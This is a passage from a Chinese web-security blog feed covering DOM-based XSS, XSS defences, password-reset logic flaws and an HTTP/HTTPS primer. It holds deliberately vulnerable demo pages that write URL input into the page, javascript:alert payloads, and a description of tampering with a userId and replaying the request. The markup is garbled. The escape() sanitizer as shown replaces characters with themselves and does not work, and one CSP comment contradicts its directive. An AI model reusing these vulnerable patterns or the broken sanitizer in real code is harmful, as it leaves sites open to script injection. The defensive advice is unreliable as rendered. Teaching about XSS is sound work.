中获取数据直接渲染。&lt;br /&gt;●尽量不要使用eval,new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.createElement()等可执行字符串的方法。&lt;br /&gt;●如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义(小程序跳转)。&lt;br /&gt;●前端渲染的时候对任何的字段都需要做 escape 转义编码。</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;CKLh7&quot;&gt;&lt;/a&gt;</span><br><span class="line">### DOM-based型攻击</span><br><span class="line">一、利用dom本身的缺陷，进行攻击&lt;br /&gt;我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。&lt;br /&gt;比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。</span><br><span class="line"></span><br><span class="line">二、DOM XSS 是**基于文档对象模型的XSS**。&lt;br /&gt;一般有如下DOM操作：&lt;br /&gt; 1. 使用document.write直接输出数据。 &lt;br /&gt; 2. 使用innerHTML直接输出数据。 &lt;br /&gt; 3. 使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。</span><br><span class="line"></span><br><span class="line">| 【示例】</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  document.body.innerHTML = &quot;&lt;a href=&#x27;&quot;+url+&quot;&#x27;&gt;&quot;+url+&quot;&lt;/a&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>假如对于变量 url 的值是：javascript:alert(‘dom-xss’); 类似这样的，那么就会收到 xss 的攻击了</th></tr></thead></table><p>因此对于 DOM XSS 主要是由于本地客户端获取的 DOM 数据在本地执行导致的。因此我们需要对 HTML 进行编码，对 JS 进行编码来防止这些问题产生。</p><p>| 【示例】 使用 document.write 直接输出导致浏览器解析恶意代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=utf-8&gt;</span><br><span class="line">  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">  &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var s = location.search;            // 返回URL中的查询部分（？之后的内容）</span><br><span class="line">    // 为了方便演示，我们假如url是 如下这样的</span><br><span class="line">    // http://127.0.0.1/xsstest.html?url=javascript:alert(&#x27;xsstest&#x27;);</span><br><span class="line">    // 然后我们的是 s 的值就为如下：</span><br><span class="line">    s = &quot;?url=javascript:alert(&#x27;xsstest&#x27;)&quot;;</span><br><span class="line">    s = s.substring(1, s.length);       // 返回整个查询内容</span><br><span class="line">    var url = &quot;&quot;;                       // 定义变量url</span><br><span class="line">    if (s.indexOf(&quot;url=&quot;) &gt; -1) &#123;       // 判断URL是否为空</span><br><span class="line">      var pos = s.indexOf(&quot;url=&quot;) + 4;  // 过滤掉&quot;url=&quot;字符</span><br><span class="line">      url = s.substring(pos, s.length);  // 得到地址栏里的url参数</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      url = &quot;url参数为空&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    document.write(&#x27;url: &lt;a href=&quot;&#x27; + url + &#x27;&quot;&gt;&quot;&#x27; + url + &#x27;&quot;&lt;/a&gt;&#x27;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>页面渲染完成后，点击弹窗如下所示：</p><table><thead><tr><th><img src="https://cdn.nlark.com/yuque/0/2022/png/355497/1647220516109-20138276-c8b6-46a6-91c0-8b774056c561.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_49,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=HDWDh&originHeight=388&originWidth=1730&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/355497/1647220516109-20138276-c8b6-46a6-91c0-8b774056c561.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_49,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=HDWDh&originHeight=388&originWidth=1730&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></th></tr></thead></table><p>| 【示例】使用 innerHTML 直接输出导致浏览器解析恶意代码&#96;&#96;&#96;javascript</p><!DOCTYPE html><html><head>  <meta charset=utf-8>  <meta name="referrer" content="never">  <title></title></head><body>  <script type="text/javascript">    var s = location.search;            // 返回URL中的查询部分（？之后的内容）    // 为了方便演示，我们假如url是 如下这样的    // http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest');     // 然后我们的是 s 的值就为如下：    s = "?url=javascript:alert('xsstest')";    s = s.substring(1, s.length);       // 返回整个查询内容    var url = "";                       // 定义变量url    if (s.indexOf("url=") > -1) {       // 判断URL是否为空       var pos = s.indexOf("url=") + 4;  // 过滤掉"url="字符      url = s.substring(pos, s.length);  // 得到地址栏里的url参数    } else {      url = "url参数为空";    }  </script>  <div id='test'><a href=""></a></div>  <script type="text/javascript">      document.getElementById("test").innerHTML = '我的url是: <a href="' + url + '">"' + url + '"</a>';  </script></body></html><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">点击一样也会弹窗窗口的。也会一样执行xss攻击的。 |</span><br><span class="line">| --- |</span><br><span class="line"></span><br><span class="line">| 【示例】使用 location/location.href/location.replace/iframe.src 造成的 XSS```javascript</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=utf-8&gt;</span><br><span class="line">  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">  &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var s = location.search;            // 返回URL中的查询部分（？之后的内容）</span><br><span class="line">    // 为了方便演示，我们假如url是 如下这样的</span><br><span class="line">    // http://127.0.0.1/xsstest.html?url=javascript:alert(&#x27;xsstest&#x27;); </span><br><span class="line">    // 然后我们的是 s 的值就为如下：</span><br><span class="line">    s = &quot;?url=javascript:alert(&#x27;xsstest&#x27;)&quot;;</span><br><span class="line">    s = s.substring(1, s.length);       // 返回整个查询内容</span><br><span class="line">    var url = &quot;&quot;;                       // 定义变量url</span><br><span class="line">    if (s.indexOf(&quot;url=&quot;) &gt; -1) &#123;       // 判断URL是否为空 </span><br><span class="line">      var pos = s.indexOf(&quot;url=&quot;) + 4;  // 过滤掉&quot;url=&quot;字符</span><br><span class="line">      url = s.substring(pos, s.length);  // 得到地址栏里的url参数</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      url = &quot;url参数为空&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;div id=&#x27;test&#x27;&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    location.href = url;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>刷新下页面，也会弹出窗口执行 xss攻击了。 || --- |<p><strong>DOM 型 XSS 的攻击步骤</strong><br />一、DOM 型 XSS 的攻击步骤如下：<br /> 1. 攻击者构造出特殊的 URL、在其中可能包含恶意代码。 <br /> 2. 用户打开带有恶意代码的 URL。<br /> 3. 用户浏览器收到响应后解析执行。前端使用 js 取出 url 中的恶意代码并执行。<br /> 4. 执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口执行攻击者一些操作。</p><p><a name="yV42u"></a></p><h1 id="XSS-防御手段"><a href="#XSS-防御手段" class="headerlink" title="XSS 防御手段"></a>XSS 防御手段<br /><br /></h1><p><a name="zodXo"></a></p><h2 id="过滤-x2F-CSP-Content-Security-Policy"><a href="#过滤-x2F-CSP-Content-Security-Policy" class="headerlink" title="过滤 &#x2F; CSP(Content-Security-Policy)"></a>过滤 &#x2F; CSP(Content-Security-Policy)</h2><p>一、移除用户输入的和事件相关的属性</p><p>| 【示例】onerror 可以自动触发攻击，还有 onclick 等。<br />移除用户输入的 Style 节点、Script 节点、Iframe 等节点。</p><p>| |<br>| |</p><p>二、CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。<br />三、通常可以通过两种方式来开启 CSP：<br />● 设置 HTTP Header 中的 Content-Security-Policy<br />● 设置 meta 标签的方式</p><p>| 【示例】这里以设置 HTTP Header 来举例：<br />● 只允许加载本站资源<br />Content-Security-Policy: default-src ‘self’ <br />● 只允许加载 HTTPS 协议图片<br />Content-Security-Policy: img-src https:&#x2F;&#x2F;* <br />● 允许加载任何来源框架<br />Content-Security-Policy: child-src ‘none’ <br />如需了解更多属性，请查看<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content-Security-Policy 文档</a></p><p>| |<br>| |</p><p>四、对于这种方式来说，只要开发者配置了正确的规则，那么即使网站存在漏洞，攻击者也不能执行它的攻击代码，并且 CSP 的兼容性也不错。</p><p><a name="OXM1w"></a></p><h2 id="编码-x2F-转义字符"><a href="#编码-x2F-转义字符" class="headerlink" title="编码 &#x2F; 转义字符"></a>编码 &#x2F; 转义字符</h2><p>一、HTML Entity 编码，对用户输入的数据进行编码</p><p>| 【示例】用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义&#96;&#96;&#96;javascript<br>function escape(str) {<br>  str &#x3D; str.replace(&#x2F;&amp;&#x2F;g, ‘&amp;’)<br>  str &#x3D; str.replace(&#x2F;&lt;&#x2F;g, ‘&lt;’)<br>  str &#x3D; str.replace(&#x2F;&gt;&#x2F;g, ‘&gt;’)<br>  str &#x3D; str.replace(&#x2F;“&#x2F;g, ‘&amp;quto;’)<br>  str &#x3D; str.replace(&#x2F;‘&#x2F;g, ‘&#39;’)<br>  str &#x3D; str.replace(&#x2F;&#96;&#x2F;g, ‘&#96;’)<br>str &#x3D; str.replace(&#x2F;/&#x2F;g, ‘&#x2F;’)<br>return str<br>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> |</span><br><span class="line">| --- |</span><br><span class="line"></span><br><span class="line">| 【示例】但是对于显示富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。以下示例使用了 js-xss 来实现，可以看到在输出中保留了 h1 标签且过滤了 script 标签。```javascript</span><br><span class="line">const xss = require(&#x27;xss&#x27;)</span><br><span class="line">let html = xss(&#x27;&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&#x27;)</span><br><span class="line">// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert(&quot;xss&quot;);&amp;lt;/script&amp;gt;</span><br><span class="line">console.log(html)</span><br></pre></td></tr></table></figure><p>| |<br>| |</p><p><a name="zlQXa"></a></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>将重要的 cookie 设置成 http only，这样就不能通过 js 获取到该 cookie 了<br />1、这是预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序在设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1663576935423-215d9f04-af0d-4b5c-89c1-f24698066784.png#clientId=udbc3878e-8c94-4&from=paste&height=358&id=ub00552af&originHeight=358&originWidth=1751&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69081&status=done&style=none&taskId=uaeea5fa4-5444-4d91-8cc7-a84d14cdafb&title=&width=1751" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1663576935423-215d9f04-af0d-4b5c-89c1-f24698066784.png#clientId=udbc3878e-8c94-4&from=paste&height=358&id=ub00552af&originHeight=358&originWidth=1751&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69081&status=done&style=none&taskId=uaeea5fa4-5444-4d91-8cc7-a84d14cdafb&title=&width=1751" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="JydVM"></a></p><h2 id="校正"><a href="#校正" class="headerlink" title="校正"></a>校正</h2><p>一、避免直接对 HTML Entity 进行解码，使用 DOM Parse 转换，校对不配对的 DOM 标签。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码重置漏洞</title>
      <link href="/2023/06/29/frontend/security/mi-ma-chong-zhi-lou-dong/"/>
      <url>/2023/06/29/frontend/security/mi-ma-chong-zhi-lou-dong/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>密码重置逻辑<br />一码多用（验证码未绑定手机号）验证码回显前端修改密码未确认用户身份验证码不失效本地验证的绕过修改接收的手机或邮箱跳过验证步骤<br />支付逻辑漏洞<br /><a href="https://www.jianshu.com/p/8ca02b6de053">https://www.jianshu.com/p/8ca02b6de053</a><br><a name="FqVSH"></a></p><h3 id="密码重置漏洞"><a href="#密码重置漏洞" class="headerlink" title="密码重置漏洞"></a>密码重置漏洞</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26802498/1648812548254-c883d7c9-c41a-49d3-94b3-3f238a0b318b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/26802498/1648812548254-c883d7c9-c41a-49d3-94b3-3f238a0b318b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>第三种方式:<br />上面原码分析,验证$userId 的参数是否在用户表中,但是没有验证是否在 cooke 中的一致,所以,申请两个账户,然后使用抓包工具,发现 userId 的差别,然后进行修改,重放,发现修改成功<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26802498/1648812549894-bdcd1bc1-b5b6-4fdd-9cfe-0bb0d962ecef.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/26802498/1648812549894-bdcd1bc1-b5b6-4fdd-9cfe-0bb0d962ecef.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="YOKCk"></a></p><h3 id="验证码不失效"><a href="#验证码不失效" class="headerlink" title="验证码不失效"></a>验证码不失效</h3><p>原因缺少<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26802498/1648812550552-ab87831a-2943-496c-ad81-e8ea0bf5df66.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/26802498/1648812550552-ab87831a-2943-496c-ad81-e8ea0bf5df66.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />验证码爆破</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http与https</title>
      <link href="/2023/06/29/frontend/security/http-yu-https/"/>
      <url>/2023/06/29/frontend/security/http-yu-https/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="2a592495"></a></p><h2 id="HTTP-与-HTTPS"><a href="#HTTP-与-HTTPS" class="headerlink" title="HTTP 与 HTTPS"></a>HTTP 与 HTTPS</h2><p><a name="HTTP"></a></p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP，全称 HyperText Transfer Protocol，中文名称超文本传输协议，传统的 web 站点都是建立在 HTTP 协议基础上进行通信的，我们访问某些站点时，首先通过该协议传输生成网页的基础文件如.html、.css、.js 等等，除此以外，还可以传输图片等其他格式文件。而这一切又需要建立在网络的基础上。通常使用的网络（包括互联网）是在 TCP&#x2F;IP 协议族的基础上运作的，而 HTTP 属于 TCP&#x2F;IP 协议族内部的一个子集。</p><p><a name="09cc1306"></a></p><h3 id="TCP-x2F-IP"><a href="#TCP-x2F-IP" class="headerlink" title="TCP&#x2F;IP"></a>TCP&#x2F;IP</h3><p>简单回顾一下计算机基础知识，何为 TCP&#x2F;IP 协议族。计算机与网络设备进行相互通信，首先双方要基于同一种方法。比如，如何探测到通信目标、由哪一边先发起通信、使用哪种语言进行通信、怎样结束通信等规则都需要事先确定。不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（protocol）。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913619382-d9f3edf6-be59-4df3-9aa1-e1f303fb8f8e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913619382-d9f3edf6-be59-4df3-9aa1-e1f303fb8f8e.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="TCP、IP是互联网相关的各类协议族的总称.png"></p><p><a name="57d03375"></a></p><h4 id="图-1-TCP-x2F-IP-是互联网相关的各类协议族的总称"><a href="#图-1-TCP-x2F-IP-是互联网相关的各类协议族的总称" class="headerlink" title="图 1.TCP&#x2F;IP 是互联网相关的各类协议族的总称"></a>图 1.TCP&#x2F;IP 是互联网相关的各类协议族的总称</h4><p>协议中存在各式各样的内容。从电缆的规格到 IP 地址的选定方法、寻找异地用户的方法、双方建立通信的顺序，以及 Web 页面显示需要处理的步骤，等等。像这样把与互联网相关联的协议集合起来总称为 TCP&#x2F;IP。</p><p>TCP&#x2F;IP 协议族里重要的一点就是分层，从上到下分为应用层、传输层、网络层、链路层。各层的作用如下：</p><ul><li><strong>应用层</strong>   应用层决定了向用户提供应用服务时通信的活动。TCP&#x2F;IP 协议族内预存了各类通用的应用服务。比如，FTP（File Transfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）服务就是其中两类。最常见的 HTTP 协议也处于该层。</li><li><strong>传输层</strong>   传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。在传输层有两个性质不同的协议：TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）。</li><li><strong>网络层</strong>   网络层用来处理在网络上流动的数据包。数据包是网络传输的最小数据单位。该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。</li><li><strong>链路层</strong>   用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（NetworkInterface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。</li></ul><p><strong>TCP&#x2F;IP 通讯传输流动：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913637128-63907609-4648-4880-95c7-42d7bdea44e8.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913637128-63907609-4648-4880-95c7-42d7bdea44e8.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="TCP、IP通讯传输流动.png"></p><p><a name="756f6553"></a></p><h4 id="图-2-TCP-x2F-IP-通讯传输流动"><a href="#图-2-TCP-x2F-IP-通讯传输流动" class="headerlink" title="图 2.TCP&#x2F;IP 通讯传输流动"></a>图 2.TCP&#x2F;IP 通讯传输流动</h4><p>无论时从服务器发起通讯还是从客户端发起通讯都必须遵循以上的数据流动原则：假如从客户端发起通讯，数据则从应用层-&gt;传输层-&gt;网络层-&gt;链路层-&gt;链路层-&gt;网络层-&gt;传输层-&gt;应用层这样传输，并且每向下经过一层便会封装包裹该层的首部信息，每向上一层消去该层的首部信息，层层校验防止出错。</p><p><a name="80d34954"></a></p><h3 id="HTTP-存在的问题"><a href="#HTTP-存在的问题" class="headerlink" title="HTTP 存在的问题"></a>HTTP 存在的问题</h3><p>HTTP 本身是比较简单方便的协议，而简单协议带来的缺点就是安全问题，主要是以下三点：</p><ul><li>通信使用明文（不加密），内容可能会被窃听。由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体进行加密。即，HTTP 报文使用明文方式发送。</li><li>不验证通信方的身份，因此有可能遭遇伪装。HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。</li><li>无法证明报文的完整性，所以有可能已遭篡改。在报文的传输过程中，必须经过物理介质传输（量子通信除外），就无法避免被外界篡改的可能。由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。虽然有部分办法能够确定报文完整性的方，但事实上不完全可靠，其中常用的是 MD5 和 SHA-1 等散列值校验的方法，以及用来确认文件的数字签名方法，但是有谁又能保证 MD5、SHA-1 计算得到的散列值不被中途篡改呢。</li></ul><p><a name="a56c601e"></a></p><h3 id="HTTP-加密-认证-完整性保护-x3D-HTTPS"><a href="#HTTP-加密-认证-完整性保护-x3D-HTTPS" class="headerlink" title="HTTP+加密+认证+完整性保护&#x3D;HTTPS"></a>HTTP+加密+认证+完整性保护&#x3D;HTTPS</h3><p>为了统一解决上述这些问题，需要在 HTTP 上再加入加密处理和认证等机制。人们把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTP Secure）。HTTPS 并非是新的协议，而是身披 SSL 外壳的 HTTP，只是把 HTTP 通信接口部分用 SSL（Secure Socket Layer）和 TLS（Transport Layer Security，TSL 是以 SSL 为原型开发的协议，有时会统一称该协议为 SSL。）协议代替而已。所以从层级间通信来说，就由 HTTP 直接和 TCP 通信演变为 HTTP 直接与 SSL 通信，再由 SSL 与 TCP 通信而已。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913653007-d5eaca4c-a35e-4c7c-bf3a-7648829e7326.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913653007-d5eaca4c-a35e-4c7c-bf3a-7648829e7326.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="HTTP与HTTPS.png"></p><p><a name="9379c769"></a></p><h4 id="图-3-HTTP-与-HTTPS"><a href="#图-3-HTTP-与-HTTPS" class="headerlink" title="图 3.HTTP 与 HTTPS"></a>图 3.HTTP 与 HTTPS</h4><p>加入了 SSL 协议之后，HTTP 就有了加密、认证和完整性保护这些功能。SSL 协议是独立的协议，不仅 HTTP 可以使用，其他运行在应用层的 FTP、SMTP 和 Telnet 等协议均可配合 SSL 协议使用。</p><p>SSL 协议采用一种叫做公开密钥加密的加密处理方式。近代的加密方法中加密算法是公开的，而密钥却是保密的。通过这种方式得以保持加密方法的安全性。加密和解密都会用到密钥。没有密钥就无法对密码解密，反过来说，任何人只要持有密钥就能解密了。如果密钥被攻击者获得，那加密也就失去了意义。</p><p>通常密钥的形式有两种，对称密钥和非对称密钥。对称密钥又称为共享密钥，是指加密和解密都公用一把密钥的加密方式。既然是共用密钥，那么就必须由一方生成，共享给另一方，共享就不可避免的要在网络上传输，在网络上传输就无法保证密钥不会被窃取，无法保证密钥不被窃取就相当于无法保证加密的完全安全性。而非对称密钥就很好的解决了这个问题，非对称密钥又称为公开密钥加密，由一把公开密钥和私有密钥组成，公开密钥可以随意公开，任何人都可以获得。使用公开密钥加密的方式，发送密文的发送方使用接收方的公开密钥进行加密，接收方接收到密文后，使用私有密钥进行解锁。这样一来，就可以避免私有密钥的网络传输，不被窃取。单独靠公开密钥和密文解密是非常难，解密过程就是在对离散对数进行求值，这并非轻而易举就能办到。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913667245-6028a187-cb89-4a6d-8782-4cea5b4e764b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913667245-6028a187-cb89-4a6d-8782-4cea5b4e764b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="非对称加密.png"></p><p><a name="5ce9182e"></a></p><h4 id="图-4-非对称加密"><a href="#图-4-非对称加密" class="headerlink" title="图 4.非对称加密"></a>图 4.非对称加密</h4><p>HTTPS 采用混合加密方式，先是通过公开密钥加密的方式交换共享加密的密钥，把密钥安全地共享给对方。之后的通信就通过共享加密进行密文通信，这样做优势在于能充分发挥两种加密方式的优点：公开加密没有传输层面被窃取的可能、共享加密消耗的资源比公开加密要低。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913673981-fcf5197c-2a3f-41d1-8fa3-228904260293.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913673981-fcf5197c-2a3f-41d1-8fa3-228904260293.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="混合加密机制.png"></p><p><a name="fc765a78"></a></p><h4 id="图-5-混合加密机制"><a href="#图-5-混合加密机制" class="headerlink" title="图 5.混合加密机制"></a>图 5.混合加密机制</h4><p><a name="282ad907"></a></p><h3 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h3><p>虽然共享加密方式的安全性得到了保证，但是如何保证公开加密的安全性？怎么保证接收到的公开加密公有密钥是货真价实的密钥，不被掉包呢？为了解决这个问题，人们提出了数字证书这一概念。在使用 HTTPS 协议前，服务器运营人员先向数字证书认证机构（CA,Certificate Authority）和其相关机关申请公开密钥证书，认证机构在接收到申请并判明申请者身份后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起发送给申请者，申请者即运营人员将其布置进服务器中。当有人访问该服务器时，服务器首先把公钥证书以公开加密方式发送至客户端，客户端接收到公钥证书后使用与之绑定的公钥密钥，对证书上的数字签名进行验证，一旦验证通过即说明该证书是准确、安全和值得信赖的。但是怎么把证书安全地转交给运营人员又成了一个问题，因此多数浏览器厂商在开发浏览器时，会首先把常用认证机构的公有密钥预先植入，这样申请者申请证书时安全性便得到保证。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913693699-bb1394dd-baad-41a5-a7be-09edf25bad97.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913693699-bb1394dd-baad-41a5-a7be-09edf25bad97.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="公钥证书认证及其使用.png"></p><p><a name="7ed23d7a"></a></p><h4 id="图-6-公钥证书认证及其使用"><a href="#图-6-公钥证书认证及其使用" class="headerlink" title="图 6.公钥证书认证及其使用"></a>图 